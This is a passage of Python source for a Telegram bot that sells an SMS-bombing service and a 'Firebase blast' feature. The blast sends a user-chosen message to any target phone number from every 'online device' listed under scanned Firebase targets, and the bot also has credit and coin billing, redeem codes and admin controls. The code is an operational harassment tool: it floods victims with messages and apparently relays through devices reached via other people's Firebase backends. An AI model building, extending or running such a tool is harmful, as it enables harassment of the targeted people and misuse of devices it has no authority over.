            f"⏱ Duration: <b>{duration_min}m</b>\n"
            f"📨 Total sent: <b>{ok}</b>\n"
            f"❌ Failed: <b>{fail}</b>\n"
            f"💳 Credits: <b>{u['credits']}</b>"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💣 Again", callback_data="b:start"),
             InlineKeyboardButton(text="🏠 Menu",  callback_data="m:home")]
        ])
        try:
            await status_msg.edit_text(text, reply_markup=kb)
        except Exception:
            pass
    except Exception as e:
        log.exception("bomb crashed")
        try:
            await status_msg.edit_text(
                f"⚠️ crashed: <code>{e}</code>", reply_markup=back_kb())
        except Exception:
            pass
    finally:
        BOMB_STOPS.pop(uid, None)


# ─────────────────────────────────────────────────────────────
# FIREBASE — USER FLOW
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "f:home")
async def cb_fb_home(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    u = get_user(c.from_user.id)
    coin_cost = setting("coin_cost", int)
    total = _exec("SELECT COUNT(*) c FROM firebase_targets WHERE active=1",
                  fetch="one")["c"]
    scanned = _exec("SELECT COUNT(*) c FROM firebase_targets "
                    "WHERE reachable=1", fetch="one")["c"]
    online = _exec("SELECT COALESCE(SUM(online_count),0) s "
                   "FROM firebase_targets", fetch="one")["s"]
    devices = _exec("SELECT COALESCE(SUM(device_count),0) s "
                    "FROM firebase_targets", fetch="one")["s"]
    await c.message.edit_text(
        f"🔥 <b>FIREBASE BLAST</b>\n\n"
        f"Send a custom message to any number from every online device.\n\n"
        f"🪙 Coins: <b>{u['coins']}</b>\n"
        f"💵 Cost: <b>{coin_cost} coin</b> per fire\n"
        f"📡 Firebase targets: <b>{total}</b>\n"
        f"✅ Reachable: <b>{scanned}</b>\n"
        f"🟢 Online devices: <b>{online}</b>\n"
        f"📱 Total devices: <b>{devices}</b>",
        reply_markup=fb_user_kb())
    await c.answer()


@dp.callback_query(F.data == "f:status")
async def cb_fb_user_status(c: types.CallbackQuery):
    rows = _exec("SELECT * FROM firebase_targets WHERE active=1 "
                 "ORDER BY online_count DESC LIMIT 20", fetch="all")
    lines = []
    for r in rows:
        mark = "✅" if r["reachable"] else "❌"
        lines.append(
            f"{mark} <code>#{r['id']}</code> "
            f"🟢 {r['online_count']}/{r['total_count']} · "
            f"<code>{r['name'][:30]}</code>")
    await c.message.edit_text(
        "📊 <b>Firebase Status</b>\n\n" +
        ("\n".join(lines) or "no targets"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Back", callback_data="f:home")]]))
    await c.answer()


@dp.callback_query(F.data == "f:send_start")
async def cb_fb_send_start(c: types.CallbackQuery, state: FSMContext):
    u = get_user(c.from_user.id)
    coin_cost = setting("coin_cost", int)
    if u["coins"] < coin_cost:
        return await c.answer(
            f"❌ Need {coin_cost} coin. You have {u['coins']}.",
            show_alert=True)
    scanned = _exec("SELECT COUNT(*) c FROM firebase_targets "
                    "WHERE reachable=1", fetch="one")["c"]
    if scanned == 0:
        return await c.answer(
            "❌ No scanned firebase yet. Ask admin to run scan.",
            show_alert=True)
    await state.set_state(UserFSM.fb_target_number)
    await c.message.edit_text(
        f"📨 <b>Firebase Blast</b>\n\n"
        f"Step 1/2: Send the target phone number.\n"
        f"<i>The message will go to that number from every online device.</i>\n\n"
        f"Send <code>-</code> to cancel.",
        reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.fb_target_number, F.text)
async def fsm_fb_target_number(m: types.Message, state: FSMContext):
    txt = (m.text or "").strip()
    if txt == "-":
        await state.clear()
        u = get_user(m.from_user.id)
        return await m.answer(
            "❌ Cancelled.",
            reply_markup=main_menu_kb(is_admin(m.from_user.id),
                                      bool(u["lifetime"])))
    digits = "".join(c for c in txt if c.isdigit())
    if len(digits) < 10:
        return await m.answer("❌ Invalid number.", reply_markup=cancel_kb())
    number = digits[-10:]
    await state.update_data(target_number=number)
    await state.set_state(UserFSM.fb_message)
    await m.answer(
        f"🎯 Target: <code>{number}</code>\n\n"
        f"Step 2/2: Now send the message body.",
        reply_markup=cancel_kb())


@dp.message(UserFSM.fb_message, F.text)
async def fsm_fb_message(m: types.Message, state: FSMContext):
    txt = (m.text or "").strip()
    if txt == "-":
        await state.clear()
        u = get_user(m.from_user.id)
        return await m.answer(
            "❌ Cancelled.",
            reply_markup=main_menu_kb(is_admin(m.from_user.id),
                                      bool(u["lifetime"])))
    message = txt[:300]
    data = await state.get_data()
    number = data.get("target_number")
    await state.clear()
    if not number:
        return await m.answer("Session expired.")

    u = get_user(m.from_user.id)
    coin_cost = setting("coin_cost", int)
    if not take_coins(m.from_user.id, coin_cost):
        return await m.answer(f"❌ Need {coin_cost} coin.")

    stop_ev = asyncio.Event()
    FB_SEND_STOPS[m.from_user.id] = stop_ev

    status = await m.answer(
        f"🔥 <b>Blasting...</b>\n\n"
        f"🎯 <code>{number}</code>\n"
        f"📨 <code>{message[:60]}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🛑 Stop", callback_data="f:stop")]
        ]))

    asyncio.create_task(_run_fb_blast(status, m.from_user.id, number,
                                       message, coin_cost, stop_ev))


@dp.callback_query(F.data == "f:stop")
async def cb_fb_stop(c: types.CallbackQuery):
    ev = FB_SEND_STOPS.get(c.from_user.id)
    if ev:
        ev.set()
        await c.answer("🛑 Stopping...", show_alert=False)
    else:
        await c.answer("Nothing running.", show_alert=True)


async def _run_fb_blast(status_msg, uid, number, message, cost, stop_ev):
    rows = _exec("SELECT * FROM firebase_targets WHERE reachable=1",
                 fetch="all")
    total_sent = 0
    delivered = 0
    for t in rows:
        if stop_ev.is_set():
            break
        try:
            s, node, err = await send_to_all_online(
                t["id"], t["url"], number, message,
                send_node=t["send_node"], stop_ev=stop_ev)
            if not err:
                total_sent += s or 0
                delivered += 1
        except Exception as e:
            log.warning("fb send fail: %s", e)
        try:
            await status_msg.edit_text(
                f"🔥 <b>Blasting...</b>\n\n"
                f"🎯 <code>{number}</code>\n"
                f"📡 Firebase done: <b>{delivered}/{len(rows)}</b>\n"
                f"📨 Sent: <b>{total_sent}</b>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🛑 Stop",
                                          callback_data="f:stop")]
                ]))
        except Exception:
            pass

    _exec("UPDATE users SET total_pushes=total_pushes+1 WHERE user_id=?",
          (uid,))
    _exec("INSERT INTO bomb_history(user_id,target,count,msg,ok,fail,"
          "category,ts) VALUES(?,?,?,?,?,?,?,?)",
          (uid, number, total_sent, message, total_sent, 0,
           "firebase_blast", int(time.time())))
    u = get_user(uid)
    try:
        await status_msg.edit_text(
            f"{'🛑 Stopped' if stop_ev.is_set() else '✅'} <b>Done</b>\n\n"
            f"🎯 <code>{number}</code>\n"
            f"📡 Firebase: <b>{delivered}/{len(rows)}</b>\n"
            f"📨 Sent: <b>{total_sent}</b>\n"
            f"🪙 Coins: <b>{u['coins']}</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔥 Again",
                                      callback_data="f:send_start"),
                 InlineKeyboardButton(text="🏠 Menu",
                                      callback_data="m:home")]
            ]))
    except Exception:
        pass
    FB_SEND_STOPS.pop(uid, None)


# ─────────────────────────────────────────────────────────────
# REDEEM
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "m:redeem")
async def cb_redeem_start(c: types.CallbackQuery, state: FSMContext):
    await state.set_state(UserFSM.redeem_code)
    await c.message.edit_text(
        "🎁 <b>Redeem Code</b>\n\nSend your code.",
        reply_markup=cancel_kb())
    await c.answer()


@dp.message(UserFSM.redeem_code, F.text)
async def fsm_redeem(m: types.Message, state: FSMContext):
    code = (m.text or "").strip().upper()
    await state.clear()
    row = _exec("SELECT * FROM redeem_codes WHERE code=? AND active=1",
                (code,), fetch="one")
    u = get_user(m.from_user.id)
    km = main_menu_kb(is_admin(m.from_user.id), bool(u["lifetime"]))
    if not row:
        return await m.answer("❌ Invalid code.", reply_markup=km)
    if row["used"] >= row["max_uses"]:
        return await m.answer("❌ Code exhausted.", reply_markup=km)
    if _exec("SELECT 1 FROM redeem_uses WHERE code=? AND user_id=?",
             (code, m.from_user.id), fetch="one"):
        return await m.answer("❌ Already used.", reply_markup=km)
    currency = row["currency"] or "credits"
    if currency == "coins":
        add_coins(m.from_user.id, row["amount"])
    else:
        add_credits(m.from_user.id, row["amount"])
    _exec("UPDATE redeem_codes SET used=used+1 WHERE code=?", (code,))
    _exec("INSERT INTO redeem_uses(code,user_id,used_at) VALUES(?,?,?)",
          (code, m.from_user.id, int(time.time())))
    log_action(m.from_user.id, "redeem",
               f"{code} +{row['amount']} {currency}")
    await m.answer(
        f"✅ Redeemed! +{row['amount']} {currency}",
        reply_markup=km)


# ─────────────────────────────────────────────────────────────
# ADMIN PANEL
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "a:home")
async def cb_admin_home(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.clear()
    await c.message.edit_text(
        "🛠 <b>Admin Panel</b>\n\nPick a section.",
        reply_markup=admin_kb())
    await c.answer()


@dp.callback_query(F.data == "a:stats")
async def cb_stats(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    total = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    banned = _exec("SELECT COUNT(*) c FROM users WHERE banned=1",
                   fetch="one")["c"]
    lifetime = _exec("SELECT COUNT(*) c FROM users WHERE lifetime=1",
                     fetch="one")["c"]
    credits = _exec("SELECT COALESCE(SUM(credits),0) s FROM users",
                    fetch="one")["s"]
    coins = _exec("SELECT COALESCE(SUM(coins),0) s FROM users",
                  fetch="one")["s"]
    bombs = _exec("SELECT COALESCE(SUM(total_bombs),0) s FROM users",
                  fetch="one")["s"]
    sent = _exec("SELECT COALESCE(SUM(total_sent),0) s FROM users",
                 fetch="one")["s"]
    pushes = _exec("SELECT COALESCE(SUM(total_pushes),0) s FROM users",
                   fetch="one")["s"]
    apis_active = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                        fetch="one")["c"]
    apis_total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    fb_total = _exec("SELECT COUNT(*) c FROM firebase_targets",
                     fetch="one")["c"]
    fb_reach = _exec("SELECT COUNT(*) c FROM firebase_targets WHERE reachable=1",
                     fetch="one")["c"]
    fb_online = _exec("SELECT COALESCE(SUM(online_count),0) s "
                      "FROM firebase_targets", fetch="one")["s"]
    fb_devices = _exec("SELECT COALESCE(SUM(device_count),0) s "
                       "FROM firebase_targets", fetch="one")["s"]
    up = int(time.time()) - START_TIME
    h, rem = divmod(up, 3600)
    mm = rem // 60
    await c.message.edit_text(
        f"📊 <b>Stats</b>\n\n"
        f"⏱ Uptime: <b>{h}h {mm}m</b>\n"
        f"👥 Users: <b>{total}</b> · banned <b>{banned}</b> · ⭐ <b>{lifetime}</b>\n"
        f"💳 Credits: <b>{credits}</b>\n"
        f"🪙 Coins: <b>{coins}</b>\n"
        f"💥 Bombs fired: <b>{bombs}</b>\n"
        f"📨 SMS sent: <b>{sent}</b>\n"
        f"🔥 Firebase fires: <b>{pushes}</b>\n\n"
        f"🔌 APIs: <b>{apis_active}/{apis_total}</b>\n"
        f"🔥 Firebase: <b>{fb_reach}/{fb_total}</b> reachable\n"
        f"🟢 Online: <b>{fb_online}</b> · 📱 Total: <b>{fb_devices}</b>",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data.startswith("a:users:"))
async def cb_users(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    page = int(c.data.split(":")[2])
    per = 10
    total = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    max_p = max(0, (total - 1) // per)
    page = min(page, max_p)
    rows = _exec("SELECT * FROM users ORDER BY created_at DESC "
                 "LIMIT ? OFFSET ?", (per, page * per), fetch="all")
    lines = [
        f"{'🚫' if r['banned'] else '✅'}{'⭐' if r['lifetime'] else ''} "
        f"<code>{r['user_id']}</code> @{r['username'] or '-'} "
        f"💳{r['credits']} 🪙{r['coins']}"
        for r in rows
    ]
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️",
                                        callback_data=f"a:users:{page-1}"))
    if page < max_p:
        nav.append(InlineKeyboardButton(text="➡️",
                                        callback_data=f"a:users:{page+1}"))
    kb = ([nav] if nav else []) + \
         [[InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]
    await c.message.edit_text(
        f"👥 <b>Users</b> — page {page+1}/{max_p+1} — total {total}\n\n" +
        ("\n".join(lines) or "empty"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await c.answer()


@dp.callback_query(F.data == "a:add")
async def cb_add(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.add_credits_uid)
    await state.update_data(mode="add_credits")
    await c.message.edit_text(
        "➕ <b>Add Credits</b>\n\nStep 1/2: Send user ID.",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.add_credits_uid, F.text)
async def fsm_add_uid(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    if not txt.isdigit():
        return await m.answer("Numeric ID required.")
    uid = int(txt)
    u = get_user(uid)
    if not u:
        return await m.answer("User not found.")
    await state.update_data(uid=uid)
    await state.set_state(AdminFSM.add_credits_amt)
    mode = (await state.get_data()).get("mode", "add_credits")
    verb = "remove" if mode == "ded_credits" else "add"
    await m.answer(
        f"Step 2/2: How many credits to {verb}?\n\n"
        f"User <code>{uid}</code> currently has <b>{u['credits']}</b> credits.")


@dp.message(AdminFSM.add_credits_amt, F.text)
async def fsm_add_amt(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    try:
        amt = int(txt)
    except ValueError:
        return await m.answer("Numeric value required.")
    d = await state.get_data()
    uid = d.get("uid")
    mode = d.get("mode", "add_credits")
    if not uid or not get_user(uid):
        await state.clear()
        return await m.answer("User not found.")
    if mode == "ded_credits":
        cur = get_user(uid)["credits"]
        new_val = max(0, cur - amt)
        _exec("UPDATE users SET credits=? WHERE user_id=?", (new_val, uid))
        log_action(m.from_user.id, "admin_ded_credits", f"to={uid} amt={amt}")
        await state.clear()
        await m.answer(
            f"✅ -{amt} credits from <code>{uid}</code>\n"
            f"New balance: <b>{new_val}</b>",
            reply_markup=admin_kb())
    else:
        add_credits(uid, amt)
        log_action(m.from_user.id, "admin_add_credits", f"to={uid} amt={amt}")
        await state.clear()
        await m.answer(
            f"✅ +{amt} credits to <code>{uid}</code>\n"
            f"New balance: <b>{get_user(uid)['credits']}</b>",
            reply_markup=admin_kb())


@dp.callback_query(F.data == "a:ded")
async def cb_ded(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.add_credits_uid)
    await state.update_data(mode="ded_credits")
    await c.message.edit_text(
        "➖ <b>Remove Credits</b>\n\nStep 1/2: Send user ID.",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data == "a:add_coins")
async def cb_add_coins(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.add_coins_uid)
    await c.message.edit_text(
        "🪙 <b>Add Coins</b>\n\nStep 1/2: Send user ID.",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.add_coins_uid, F.text)
async def fsm_add_coins_uid(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    if not txt.isdigit():
        return await m.answer("Numeric ID required.")
    uid = int(txt)
    u = get_user(uid)
    if not u:
        return await m.answer("User not found.")
    await state.update_data(uid=uid)
    await state.set_state(AdminFSM.add_coins_amt)
    await m.answer(
        f"Step 2/2: How many coins?\n"
        f"User <code>{uid}</code> currently has <b>{u['coins']}</b>.")


@dp.message(AdminFSM.add_coins_amt, F.text)
async def fsm_add_coins_amt(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    try:
        amt = int(txt)
    except ValueError:
        return await m.answer("Numeric value required.")
    d = await state.get_data()
    uid = d.get("uid")
    if not uid or not get_user(uid):
        await state.clear()
        return await m.answer("User not found.")
    add_coins(uid, amt)
    log_action(m.from_user.id, "admin_add_coins", f"to={uid} amt={amt}")
    await state.clear()
    await m.answer(
        f"✅ +{amt} coins to <code>{uid}</code>\n"
        f"New: <b>{get_user(uid)['coins']}</b>",
        reply_markup=admin_kb())


@dp.callback_query(F.data == "a:lt_grant")
async def cb_lt_grant(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.grant_lt_uid)
    await c.message.edit_text(
        "⭐ <b>Grant Lifetime</b>\n\nSend user ID.",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.grant_lt_uid, F.text)
async def fsm_lt_grant(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    if not txt.isdigit():
        return await m.answer("Numeric ID required.")
    uid = int(txt)
    if not get_user(uid):
        return await m.answer("Not found.")
    _exec("UPDATE users SET lifetime=1 WHERE user_id=?", (uid,))
    log_action(m.from_user.id, "admin_grant_lt", str(uid))
    await state.clear()
    await m.answer(f"⭐ Lifetime granted to <code>{uid}</code>",
                   reply_markup=admin_kb())


@dp.callback_query(F.data == "a:lt_revoke")
async def cb_lt_revoke(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.revoke_lt_uid)
    await c.message.edit_text(
        "🚫 <b>Revoke Lifetime</b>\n\nSend user ID.",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.revoke_lt_uid, F.text)
async def fsm_lt_revoke(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    if not txt.isdigit():
        return await m.answer("Numeric ID required.")
    uid = int(txt)
    _exec("UPDATE users SET lifetime=0 WHERE user_id=?", (uid,))
    log_action(m.from_user.id, "admin_revoke_lt", str(uid))
    await state.clear()
    await m.answer(f"🚫 Lifetime revoked for <code>{uid}</code>",
                   reply_markup=admin_kb())


@dp.callback_query(F.data == "a:lt_list")
async def cb_lt_list(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    rows = _exec("SELECT user_id, username, credits FROM users "
                 "WHERE lifetime=1 ORDER BY created_at DESC", fetch="all")
    lines = [
        f"⭐ <code>{r['user_id']}</code> @{r['username'] or '-'} "
        f"💳{r['credits']}" for r in rows
    ]
    await c.message.edit_text(
        f"⭐ <b>Lifetime Users</b> — {len(rows)} total\n\n" +
        ("\n".join(lines) or "none"),
        reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data == "a:redeem")
async def cb_a_redeem(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    rows = _exec("SELECT * FROM redeem_codes ORDER BY created_at DESC "
                 "LIMIT 15", fetch="all")
    lines = [
        f"<code>{r['code']}</code> | {r['amount']} {r['currency'] or 'credits'} | "
        f"{r['used']}/{r['max_uses']}" for r in rows
    ]
    await c.message.edit_text(
        "🎁 <b>Redeem Codes</b>\n\n" + ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Create Code",
                                  callback_data="a:redeem_new")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:redeem_new")
async def cb_redeem_new(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await c.message.edit_text(
        "🎁 <b>Create Redeem Code</b>\n\nStep 1/3: Currency?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💳 Credits",
                                  callback_data="a:redeem_cur:credits"),
             InlineKeyboardButton(text="🪙 Coins",
                                  callback_data="a:redeem_cur:coins")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data.startswith("a:redeem_cur:"))
async def cb_redeem_cur(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    cur = c.data.split(":")[2]
    await state.update_data(currency=cur)
    await state.set_state(AdminFSM.redeem_amount)
    await c.message.edit_text(
        f"🎁 Currency: <b>{cur}</b>\n\nStep 2/3: Send the amount.",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.redeem_amount, F.text)
async def fsm_redeem_amt(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    try:
        amt = int(txt)
    except ValueError:
        return await m.answer("Numeric value required.")
    await state.update_data(amount=amt)
    await state.set_state(AdminFSM.redeem_uses)
    await m.answer("Step 3/3: Max uses? (0 = unlimited)")


@dp.message(AdminFSM.redeem_uses, F.text)
async def fsm_redeem_uses(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    try:
        uses = int(txt)
    except ValueError:
        return await m.answer("Numeric required.")
    if uses <= 0:
        uses = 10 ** 9
    d = await state.get_data()
    code = gen_code(10)
    _exec("INSERT INTO redeem_codes(code,amount,currency,max_uses,"
          "created_by,created_at) VALUES(?,?,?,?,?,?)",
          (code, d["amount"], d.get("currency", "credits"), uses,
           m.from_user.id, int(time.time())))
    log_action(m.from_user.id, "admin_create_code", f"{code}")
    await state.clear()
    await m.answer(
        f"✅ Code: <code>{code}</code>\n"
        f"Amount: <b>{d['amount']} {d.get('currency', 'credits')}</b>\n"
        f"Uses: <b>{uses}</b>",
        reply_markup=admin_kb())


@dp.callback_query(F.data == "a:apis")
async def cb_apis(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    active = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                   fetch="one")["c"]
    per_cat = _exec(
        "SELECT category, COUNT(*) c, COALESCE(SUM(ok_count),0) o, "
        "COALESCE(SUM(fail_count),0) f FROM apis GROUP BY category",
        fetch="all")
    lines = [f"• <b>{r['category'] or '?'}</b>: {r['c']} · "
             f"{r['o']}✅ {r['f']}❌" for r in per_cat]
    await c.message.edit_text(
        f"🔌 <b>APIs</b>\n\n"
        f"Total: <b>{total}</b> · Active: <b>{active}</b>\n\n" +
        "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Reseed All",
                                  callback_data="a:api_reseed")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:api_reseed")
async def cb_api_reseed(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    seed_all_endpoints(force_refresh=True)
    total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    await c.answer(f"✅ Reseeded — {total} endpoints", show_alert=True)


@dp.callback_query(F.data == "a:settings")
async def cb_settings(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    keys = [
        ("cost_per_min",   "Credit cost per minute"),
        ("lifetime_cost",  "Lifetime unlock price (credits)"),
        ("coin_cost",      "Coins per firebase fire"),
        ("cooldown",       "Seconds between bombs"),
        ("concurrency",    "Global parallel workers"),
        ("daily_bonus",    "Daily bonus credits"),
        ("referral_bonus", "Credits per referral"),
        ("maintenance",    "1 = locked, 0 = normal"),
    ]
    lines = [f"<b>{k}</b> = {setting(k)}\n<i>{d}</i>" for k, d in keys]
    rows = []
    for i in range(0, len(keys), 2):
        row = [InlineKeyboardButton(text=keys[i][0],
                                    callback_data=f"a:set:{keys[i][0]}")]
        if i + 1 < len(keys):
            row.append(InlineKeyboardButton(
                text=keys[i + 1][0],
                callback_data=f"a:set:{keys[i + 1][0]}"))
        rows.append(row)
    rows.append([InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")])
    await c.message.edit_text(
        "⚙️ <b>Settings</b>\n\nTap to change:\n\n" + "\n\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    await c.answer()


@dp.callback_query(F.data.startswith("a:set:"))
async def cb_set_edit(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    key = c.data.split(":", 2)[2]
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(key=key)
    await c.message.edit_text(
        f"⚙️ <b>Edit {key}</b>\n\nCurrent: <b>{setting(key)}</b>\n\n"
        f"Send new value.",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.edit_setting, F.text)
async def fsm_edit_setting(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    d = await state.get_data()
    key = d.get("key")
    numeric = {"cost_per_min", "lifetime_cost", "coin_cost", "cooldown",
               "concurrency", "daily_bonus", "referral_bonus", "maintenance"}
    if key in numeric:
        try:
            int(txt)
        except ValueError:
            return await m.answer("Numeric required.")
    set_setting(key, txt)
    log_action(m.from_user.id, "admin_set_setting", f"{key}={txt}")
    await state.clear()
    await m.answer(f"✅ {key} = {txt}", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:black")
async def cb_black(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    rows = _exec("SELECT * FROM blacklist ORDER BY added_at DESC LIMIT 20",
                 fetch="all")
    lines = [f"• <code>{r['target']}</code>" for r in rows]
    await c.message.edit_text(
        "🚫 <b>Blacklist</b>\n\n" + ("\n".join(lines) or "empty"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add", callback_data="a:black_add"),
             InlineKeyboardButton(text="🗑 Remove",
                                  callback_data="a:black_del")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:black_add")
async def cb_black_add(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.blacklist_add)
    await state.update_data(mode="black_add")
    await c.message.edit_text("🚫 Send number to block.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data == "a:black_del")
async def cb_black_del(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.blacklist_add)
    await state.update_data(mode="black_del")
    await c.message.edit_text("🗑 Send number to unblock.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.blacklist_add, F.text)
async def fsm_black(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    d = await state.get_data()
    mode = d.get("mode", "black_add")
    if mode == "black_add":
        _exec("INSERT OR IGNORE INTO blacklist(target,added_by,added_at) "
              "VALUES(?,?,?)", (txt, m.from_user.id, int(time.time())))
        await m.answer(f"✅ Blocked <code>{txt}</code>",
                       reply_markup=admin_kb())
    else:
        _exec("DELETE FROM blacklist WHERE target=?", (txt,))
        await m.answer(f"✅ Unblocked <code>{txt}</code>",
                       reply_markup=admin_kb())
    await state.clear()


@dp.callback_query(F.data == "a:find")
async def cb_find(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.find_user)
    await c.message.edit_text("🔎 Send user ID.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.find_user, F.text)
async def fsm_find(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    if not txt.isdigit():
        return await m.answer("Numeric required.")
    uid = int(txt)
    u = get_user(uid)
    if not u:
        return await m.answer("Not found.")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="🚫 Ban" if not u["banned"] else "✅ Unban",
            callback_data=f"a:ban:{uid}")],
        [InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]])
    await m.answer(
        f"👤 <code>{uid}</code>\n"
        f"@{u['username'] or '-'}\n"
        f"💳 {u['credits']} · 🪙 {u['coins']}\n"
        f"⭐ {'Yes' if u['lifetime'] else 'No'}\n"
        f"💥 Bombs: {u['total_bombs']} · 📨 Sent: {u['total_sent']}\n"
        f"🔥 Firebase: {u['total_pushes']}\n"
        f"Status: {'🚫 banned' if u['banned'] else '✅ active'}",
        reply_markup=kb)
    await state.clear()


